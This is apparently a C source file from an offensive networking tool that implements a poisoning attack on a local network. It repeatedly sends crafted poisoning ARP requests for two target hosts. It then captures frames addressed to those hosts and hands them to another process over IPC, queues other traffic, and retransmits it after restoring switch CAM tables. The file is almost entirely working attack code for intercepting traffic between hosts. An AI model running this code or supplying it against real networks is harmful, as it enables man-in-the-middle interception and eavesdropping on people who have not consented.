
#include <poison.h>

// standard headers
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>

#include <sys/epoll.h>

// local headers
#include <arp.h>
#include <iface.h>
#include <logger.h>
#include <utils.h>


/****************************
 * Message queue management *
 ****************************/
void static inline init_queue(struct queue *q) {
	q->entries = (struct qlist*) malloc(
			QUEUE_INIT_SIZE * sizeof(struct qlist)
			);
	if (q->entries == NULL) {
		perror("Cannot allocate memory for the message queue");
		exit(1);
	}
	q->count = 0;
	q->size = QUEUE_INIT_SIZE;
	log_debug("Message queue initialized\n");
}
void static inline free_queue(struct queue *q) {
	int i, j;
	// free all queued messages
	for (i=0; i<q->count; i++) {
		for (j=0; j<q->entries[i].count; j++) {
			free(q->entries[i].messages[j].buf);
		}
	}
	// free the list of qlist
	free(q->entries);
	q->count = 0;
	q->size = 0;
	log_debug("Message queue freed\n");
}

/*
 * Find the right qlist entry or create one
 */
struct qlist static inline *queue_get_entry(struct queue *q,
		uint8_t dest[ETH_ALEN]) {
	int i;
	struct qlist *cur_entry;
	struct qlist *entries;

	// try to find the qlist entry for the given sender
	for (i = 0; i < q->count; i++) {
		if (ETHER_CMP(dest, q->entries[i].dest))
			return &q->entries[i];
	}

	// increase the size of the message_q if needed
	if (q->count == q->size) {
		// increase the size of the queue if needed
		entries = (struct qlist*) realloc(q->entries,
				2 * q->size * sizeof(struct qlist));
		if (entries == NULL) {
			log_warning("Cannot reallocate memory to extend message queue\n");
			return NULL;
		}
		q->entries = entries;
		q->size *= 2;
	}

	// initialize the qlist with base info
	cur_entry = &q->entries[q->count++];
	memcpy(cur_entry->dest, dest, ETH_ALEN);
	cur_entry->count = 0;
	return cur_entry;
}

/*
 * Queue the message in the right queue_list
 */
int static inline queue_message(struct queue *q, void *buf, size_t buflen) {
	int i;
	struct qlist *cur_entry;
	struct ether_header *eh;
	uint8_t *msg;

	// parse the buffer as an ethernet frame
	eh = (struct ether_header *) buf;

	// get the qlist
	cur_entry = queue_get_entry(q, eh->ether_dhost);
	if (cur_entry == NULL) {
		// failed to create the entry (mainly due to memory)
		return 0;
	}

	// append the message to the qlist
	if (cur_entry->count < QLIST_MAX_SIZE) {
		msg = (uint8_t *) malloc(buflen);
		if (msg == NULL) {
			perror("Could not allocate memory to queue message");
			return 0;
		}
		memcpy(msg , buf, buflen);
		cur_entry->messages[cur_entry->count].buf = msg;
		cur_entry->messages[cur_entry->count++].len = buflen;

		log_debug("Message queued\n");
		return 1;
	} else {
		log_warning("Could not queue the message because the queue is full\n");
		return 0;
	}
}

// Some inline function (for speed) which compose launch_attack()
int static inline poison_mac(int sock, struct iface *iface,
		uint8_t mac[ETH_ALEN]) {
	struct arp_pkt req;

	// create the poisoning arp request
	if (!arp_poison(iface, mac, &req, sizeof(req))) {
		log_error("Failed to craft an poisoning arp request\n");
		return 0;
	}
	// send it
	if (send(sock, &req, sizeof(req), 0) == -1) {
		perror("Error while sending arp");
		return 0;
	}
	return 1;
}

int static inline receive_messages(int epollfd, struct ipc *ipc,
		struct iface *iface, struct queue *q, int duration,
		uint8_t h1[ETH_ALEN], uint8_t h2[ETH_ALEN]) {

	// prepare the args structure for the callback
	struct cb_args args;
	args.queue = q;
	args.h1 = h1;
	args.h2 = h2;
	args.local = iface->hwaddr;
	args.ipc = ipc;

	// receive all messages for the duraction
	switch (recvfrom_multiple_with_timeout(epollfd, duration,
				&receive_messages_callback, &args)) {
		case -1:
			// error
			return 0;	// stop here with an error
		case 0:
			// timeout
		default:
			// recvfrom found the right packet
			return 1;	// stop here with a success
	}
}
int receive_messages_callback(void *buf, ssize_t buflen,
		struct sockaddr *addr, socklen_t addr_l, void *args) {
	// cast args
	struct cb_args *cb_args = args;

	if (addr->sa_family == AF_UNIX) {			// received from the IPC
		// Consider the empty datagram as flush request
		if (buflen == 0) {
			log_debug("Received a flushing request\n");
			return 1;	// to flush, just force recvfrom to end
		} else if (buflen >= sizeof(struct ether_header)) { // ensure valid eth
			// cast to ethernet
			struct ether_header *eh = (struct ether_header *)buf;
			log_debug("New message from IPC: "
					"%02x:%02x:%02x:%02x:%02x:%02x -> "
					"%02x:%02x:%02x:%02x:%02x:%02x [%04x]\n",
					eh->ether_shost[0], eh->ether_shost[1],
					eh->ether_shost[2], eh->ether_shost[3],
					eh->ether_shost[4], eh->ether_shost[5],
					eh->ether_dhost[0], eh->ether_dhost[1],
					eh->ether_dhost[2], eh->ether_dhost[3],
					eh->ether_dhost[4], eh->ether_dhost[5],
					ntohs(eh->ether_type));

			queue_message(cb_args->queue, buf, buflen);
		}
	} else if (addr->sa_family == AF_PACKET) {	// received from the network
		// cast to ethernet frame
		struct ether_header *eh = (struct ether_header *)buf;
		struct sockaddr_ll *recvaddr = (struct sockaddr_ll *)addr;

		// Only treat incoming ethernet frames
		if (recvaddr->sll_pkttype != PACKET_OUTGOING &&
				buflen >= sizeof(struct ether_header)) {	// prevent OOB read

			log_debug("New message from network interface: "
					"%02x:%02x:%02x:%02x:%02x:%02x -> "
					"%02x:%02x:%02x:%02x:%02x:%02x [%04x]\n",
					eh->ether_shost[0], eh->ether_shost[1],
					eh->ether_shost[2], eh->ether_shost[3],
					eh->ether_shost[4], eh->ether_shost[5],
					eh->ether_dhost[0], eh->ether_dhost[1],
					eh->ether_dhost[2], eh->ether_dhost[3],
					eh->ether_dhost[4], eh->ether_dhost[5],
					ntohs(eh->ether_type));

			// If the frame goes to one of the hosts, we send the frame
			// through the IPC.
			// If it goes to the local interface, we dont treat it
			// Else we queue it for later retransmission
			if (ETHER_CMP(eh->ether_dhost, cb_args->h1) ||
					ETHER_CMP(eh->ether_dhost, cb_args->h2)) {
				// send through IPC
				if (sendto_ipc(cb_args->ipc, buf, buflen) == -1) {
					perror("Failed to send frame through IPC");
				}
			} else if (ETHER_CMP(eh->ether_dhost, cb_args->local)) {
				log_debug("Frame for the local interface discarded\n");
			} else {
				// other Ethernet frame => queue if its a unicast frame
				if ((eh->ether_dhost[0] & 0x01) == 0x00) {
					queue_message(cb_args->queue, buf, buflen);
				} else {
					log_debug("Multicast ethernet frame discarded\n");
				}
			}
		}
	}
	return 0;	// continue the recvfrom loop
}

/*
 * CAM table restoration
 */
int static inline restore_mac_async(int sock,
		struct iface *iface, uint8_t mac[ETH_ALEN]) {
	struct arp_pkt req;
	struct in_addr *ip = arp_cache_search_ip(mac);

	// check the MAC address is in the local ARP cache
	if (ip == NULL) {
		log_error("%02x:%02x:%02x:%02x:%02x:%02x cannot be resolved to IP. "
				"Skip it\n", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
		return 0;
	}

	log_debug("Start sending ARP request asynchronously to restore "
			"%02x:%02x:%02x:%02x:%02x:%02x in CAM tables\n",
			mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);

	// create the arp request to restore the CAM tables
	if (!arp_request(iface, ip->s_addr, &req, sizeof(req))) {
		log_error("Failed to craft an arp request to restore CAM tables\n");
		return 0;
	}
	// send it
	if (send(sock, &req, sizeof(req), 0) == -1) {
		perror("Error while sending arp");
		return 0;
	}
	return 1;
}

int static inline restore_mac(int sock, struct queue *q,
		struct iface *iface, uint8_t mac[ETH_ALEN]) {
	int i;
	struct arp_pkt req;
	struct cb_args args;
	args.ip = arp_cache_search_ip(mac);
	args.queue = q;

	// check the MAC address is in the local ARP cache
	if (args.ip == NULL) {
		log_error("%02x:%02x:%02x:%02x:%02x:%02x cannot be resolved to IP. "
				"Skip it\n", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
		return 0;
	}

	// create the arp request to restore the CAM tables
	if (!arp_request(iface, args.ip->s_addr, &req, sizeof(req))) {
		log_error("Failed to craft an arp request to restore CAM tables\n");
		return 0;
	}

	log_debug("Start sending ARP requests to restore "
			"%02x:%02x:%02x:%02x:%02x:%02x in CAM tables\n",
			mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);

	// loop for several retries
	for (i=0; i<ARP_RESTORE_MAX_RETRY; i++) {
		log_debug("ARP Restoration: sending packet #%i\n", i+1);
		if (send(sock, &req, sizeof(req), 0) == -1) {
			perror("Error while sending ARP");
			return 0;
		}

		// read response to locate the ARP reply
		switch (recvfrom_with_timeout(sock, ARP_RESTORE_TIMEOUT,
					&restore_mac_callback, &args)) {
			case -1:
				// error
				return 0;	// stop here with an error
			case 0:
				// timeout
				continue;	// retry with next ARP request
			default:
				// recvfrom found the right packet
				return 1;	// stop here with a success
		}
	}

	// the MAC could not be restore even after retries
	log_error("Failed to restore CAM tables\n");
	return 0;
}

/*
 * Callback for recvfrom_with_timeout
 * It may either queue the message or stop reading if it is not the expected
 * response.
 * args should be a pointer to a struct in_addr which is the requested IP
 */
int restore_mac_callback(void *buf, ssize_t buflen,
		struct sockaddr *addr, socklen_t addr_l, void *args) {


	// cast args
	struct cb_args *cb_args = args;

	// cast to arp packet
	struct arp_pkt *res = (struct arp_pkt *)buf;
	struct sockaddr_ll *recvaddr = (struct sockaddr_ll *)addr;

	// Only treat incoming ethernet frames
	if (recvaddr->sll_pkttype != PACKET_OUTGOING &&
			buflen >= sizeof(struct ether_header)) {	// prevent OOB read

		// locate ARP packets
		if (buflen >= sizeof(struct arp_pkt) &&			// prevent OOB read
			res->eh.ether_type == htons(ETHERTYPE_ARP)) {
			// ARP packet
			// Need to be sure it is the expected response to stop the recv
			// other request or responses are discarded
			if (res->ah.arp_hrd == htons(ARPHRD_ETHER) &&
					res->ah.arp_pro == htons(ETHERTYPE_IP) &&
					res->ah.arp_op == htons(ARPOP_REPLY) &&
					ntohl(*(in_addr_t *)res->ah.arp_spa) ==
					cb_args->ip->s_addr) {
				// it is the expected response => stop
				log_debug("Received ARP reply which restored CAM tables\n");
				return 1;
			}
		} else {
			// other Ethernet frame => just queue it
			queue_message(cb_args->queue, buf, buflen);
		}
	}
	return 0;	// continue the recvfrom loop
}

int static inline retransmit_one(int sock, struct iface *iface,
		struct message *msg) {
	struct ether_header *eth = (struct ether_header *) msg->buf;

	// Send the message
	if (send(sock, eth, msg->len, 0) == -1) {
		perror("Error while retransmitting the message");
		return 0;
	}

	log_debug("Message retransmitted %02x:%02x:%02x:%02x:%02x:%02x -> "
			"%02x:%02x:%02x:%02x:%02x:%02x [%04x]\n",
			eth->ether_shost[0], eth->ether_shost[1],
			eth->ether_shost[2], eth->ether_shost[3],
			eth->ether_shost[4], eth->ether_shost[5],
			eth->ether_dhost[0], eth->ether_dhost[1],
			eth->ether_dhost[2], eth->ether_dhost[3],
			eth->ether_dhost[4], eth->ether_dhost[5],
			ntohs(eth->ether_type));

	// A side effect of frame retransmission is that the sender's MAC
	// address is poisoned in CAM tables too => force the restoration
	// of this address (asynchronously because we don't really mind
	// whether it successfully restore CAM tables)
	restore_mac_async(sock, iface, eth->ether_shost);
	return 1;	// success
}

int static inline retransmit_all(int sock, struct iface *iface,
		struct queue *old_q, struct queue *new_q) {
	int i, j;
	// iterate over each qlist of the old queue
	for (i = 0; i < old_q->count; i++) {
		if (old_q->entries[i].count > 0) {
			// first restore MAC
			if (!restore_mac(sock, new_q, iface, old_q->entries[i].dest)) {
				log_error("Skip retransmission: packets will be lost\n");
				continue;
			}
			// then retransmit all frames
			for (j = 0; j < old_q->entries[i].count; j++) {
				if (!retransmit_one(sock, iface,
							&old_q->entries[i].messages[j])) {
					log_warning("Could not retransmit one message\n");
				}
			}
		}
	}
}

void launch_attack(struct iface *iface, struct ipc *ipc, int freq,
		struct in_addr h1, struct in_addr h2) {
	// open the super socket for injection
	int sock = super_socket(iface, SOCK_RAW, ETH_P_ALL);

	// create the message queue
	struct queue current_q, old_q;
	init_queue(&current_q);

	// resolve IP addresses to MAC addressess
	uint8_t *h1_mac = arp_cache_search_mac(h1);
	uint8_t *h2_mac = arp_cache_search_mac(h2);

	// prepare the epoll structure to read both sock & ipc
	struct epoll_event ev;
	int epollfd = epoll_create1(0);
	if (epollfd == -1) {
		perror("Failed to create the epoll to launch attack");
		exit(1);
	}

	// Add the events to the structure
	memset(&ev, 0, sizeof(struct epoll_event));
	ev.events = EPOLLIN;
	ev.data.fd = sock;
	if (epoll_ctl(epollfd, EPOLL_CTL_ADD, sock, &ev) == -1) {
		perror("Failed to add the socket to the epoll");
		exit(1);
	}

	memset(&ev, 0, sizeof(struct epoll_event));
	ev.events = EPOLLIN;
	ev.data.fd = ipc->sock;
	if (epoll_ctl(epollfd, EPOLL_CTL_ADD, ipc->sock, &ev) == -1) {
		perror("Failed to add the IPC to the epoll");
		exit(1);
	}

	// poisoning loop
	log_info("Start poisoning attack\n");
	log_debug("Attack frequency is %ims\n", freq);
	while (1) {
		// poison both hosts' MAC addresses
		log_debug("Launch poisoning ARP requests\n");
		if (!poison_mac(sock, iface, h1_mac) ||
				!poison_mac(sock, iface, h2_mac)) {
			continue; // stop there on failure
		}

		// Read incoming messages for the given duration
		log_debug("Read incoming frames\n");
		if (!receive_messages(epollfd, ipc,
					iface, &current_q, freq,
					h1_mac, h2_mac)){
			continue; // stop there on failure
		}

		// to speed thing up, only retransmit is there are frames
		if (current_q.count > 0) {
			// Fix the queue and retransmit it
			log_debug("Retransmit queued frames\n");
			memcpy(&old_q, &current_q, sizeof(old_q));
			init_queue(&current_q);
			if (!retransmit_all(sock, iface, &old_q, &current_q)) {
				free_queue(&old_q);
				continue; // stop there on failure
			}
			free_queue(&old_q);
		} else {
			log_debug("No frames to retransmit\n");
		}
	}

	// free elements
	free_queue(&current_q);

	if (epoll_ctl(epollfd, EPOLL_CTL_DEL, ipc->sock, &ev) == -1) {
		perror("Failed to remove the IPC to the epoll");
	}
	if (epoll_ctl(epollfd, EPOLL_CTL_DEL, sock, &ev) == -1) {
		perror("Failed to remove the IPC to the epoll");
	}

	close(epollfd);
	close(sock);
}
